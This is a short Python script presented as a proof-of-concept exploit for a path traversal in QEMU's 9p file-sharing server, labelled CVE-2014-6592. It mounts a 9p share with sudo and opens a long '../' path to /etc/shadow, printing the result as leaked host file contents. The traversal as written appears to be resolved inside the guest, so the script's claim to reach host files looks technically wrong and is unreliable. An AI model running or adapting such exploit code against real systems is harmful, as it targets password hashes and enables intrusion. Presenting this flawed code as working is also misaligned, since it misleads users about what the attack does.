#!/usr/bin/env python3
#
# PoC for QEMU 9pfs Path Traversal
# CVE-2014-6592
#
# Exploits lack of sanitization in QEMU's 9p server to escape mount
# root and read arbitrary host files via “../” sequences.

import os

MOUNT_POINT = "/mnt/9p"
SHARE_NAME  = "hostshare"
HOST_FILE   = "/etc/shadow"

def mount_9p():
    opts = "trans=virtio,version=9p2000.L"
    cmd = f"sudo mount -t 9p -o {opts} {SHARE_NAME} {MOUNT_POINT}"
    if os.system(cmd) != 0:
        print("[-] Failed to mount 9p share")
        exit(1)
    print(f"[+] Mounted 9p share {SHARE_NAME} at {MOUNT_POINT}")

def read_via_traversal():
    # Craft a traversal path that climbs above MOUNT_POINT
    traversal = "../" * 10 + HOST_FILE.lstrip("/")
    path = os.path.join(MOUNT_POINT, traversal)
    try:
        with open(path, "r") as f:
            print(f"[+] Leaked contents of {HOST_FILE}:\n")
            print(f.read())
    except Exception as e:
        print(f"[-] Error reading host file: {e}")

if __name__ == "__main__":
    mount_9p()
    read_via_traversal()